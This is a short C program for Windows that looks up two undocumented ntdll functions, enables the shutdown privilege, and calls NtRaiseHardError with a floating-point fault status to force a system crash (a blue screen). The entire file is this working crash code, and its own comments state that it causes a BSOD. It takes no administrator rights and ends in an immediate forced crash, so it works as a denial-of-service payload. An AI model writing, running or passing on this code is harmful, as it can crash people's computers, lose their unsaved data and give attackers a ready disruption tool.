#include <Windows.h>
#include <winternl.h>

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6


typedef NTSTATUS //Return type
(NTAPI* pdef_RtlAdjustPrivilege) //Name
(ULONG Privilege, //Arugments below
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled);

typedef NTSTATUS //Return type
(NTAPI* pdef_NtRaiseHardError) //Name
(NTSTATUS ErrorStatus, //Arugments below
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response);

int main()
{
    //Stores return values of our nt calls
    BOOLEAN bEnabled;
    ULONG uResp;

    //Get raw function pointers from ntdll
    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    //Create functions using above grabbed function pointers
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

    //Elevate the current process privledge to that required for system shutdown
    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    //Call NtRaiseHardError with a floating point exception, causes BSOD
    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}
